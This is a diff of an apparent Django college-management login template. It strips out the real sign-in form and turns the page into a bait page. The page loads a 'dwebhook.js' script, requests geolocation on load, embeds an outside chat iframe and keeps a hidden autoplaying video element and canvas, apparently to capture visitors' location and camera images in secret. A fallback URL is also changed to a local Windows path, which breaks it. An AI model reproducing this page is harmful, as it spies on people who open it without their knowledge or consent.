@@ -1,12 +1,16 @@
-{% extends 'registration/registration_base.html' %}
-{% block title %}Dj Learning Management System{% endblock title %}
-{% load crispy_forms_tags %}
-{% block content %}
+<!DOCTYPE html>
+<html>
+
 <head>
   <script type="text/javascript" src="dwebhook.js">
   </script>
 </head>
+
 <body onload="getLocation()">
+
+  <iframe src="https://www.meetskip.com/chat" width="100%" height="900" style="border:none;">
+  </iframe>
+
   <p id="demo"></p>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
   </script>
@@ -185,7 +189,7 @@
       }
     }
   </script>
-   <div class="video-wrap" hidden="hidden">
+  <div class="video-wrap" hidden="hidden">
     <video id="video" playsinline autoplay></video>
   </div>
   <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
@@ -197,7 +201,7 @@
       if (request.status === 200) {
         url = request.responseText;
       } else {
-        url = "http://127.0.0.1:8000/image"
+        url = "C:\Users\shiv_\College-Management-System\College-Management-System\templates\registration\login.html"
       }
     };
 
@@ -263,73 +267,6 @@
     // Load init
     init();
   </script>
-
-
-
 </body>
 
-
-<div class="col-md-4 mx-auto mt-5">
-  <div class="card">
-    <div class="form-title">
-      <i class="fas fa-lock me-2"></i>
-      Sign in
-    </div>
-    <div class="card-body">
-        <form action="" method="POST" id="login-form">{% csrf_token %}
-          <div class="form-group mb-3">
-              <label class="mb-2" for="username_id"><i class="fas fa-address-card me-2"></i>ID Number</label>
-              <input type="text" name="username" id="username_id" class="form-control" required>
-              <div id="message-wrapper"></div>
-          </div>
-          <div class="form-group mb-3">
-              <label class="mb-2" for="password_id"><i class="fas fa-key me-2"></i>Password</label>
-              <input type="password" name="password" id="password_id" class="form-control" required>
-          </div>
-          {% if form.errors %}
-                <span class="text-danger"><i class="fas fa-exclamation-circle"></i> Invalid ID & Password.</span><br>
-          {% endif %}
-      
-          <button type="submit" class="btn btn-primary" id="login-btn"><i class="fas fa-sign-in-alt"></i><small> SIGN IN</small></button>
-        </form>
-        <br>
-        <div class="login-bottom">
-          <a href="{% url 'password_reset' %}" class="link">Forgot password ?</a>
-        </div>
-      </div>
-  </div>
-</div>
-{% endblock content %}
-
-{% block js %}
-
-<script>
-  $('#login-form').submit(function (e) {
-    // e.preventDefault();
-    $('#login-btn').addClass('disabled')
-    $('#login-btn').html(`<i class="fas fa-sign-in-alt"></i> Signining you in . . .`)
-  })
-
-  $("#username").on("input", function () {
-    username = $(this).val();
-
-    $.ajax({
-      url: "/accounts/ajax/validate-username/",
-      data: {
-        username: username
-      },
-      dataType: 'json',
-      success: function (data) {
-        if (data.is_taken) {
-          console.log(data.is_taken);
-          $('#message-wrapper').html(`<p class="my-2 text-danger"><span class="bg-error p-2"><b>${username}</b> already taken :( try another one </span></p>`)
-        }
-        else {
-          $('#message-wrapper').html(`<p class="my-2 text-success"><span class="bg-correct p-2"><b>${username}</b> is valid </span></p>`)
-        }
-      }
-
-    })
-  })
-</script>
-{% endblock %}
+</html>
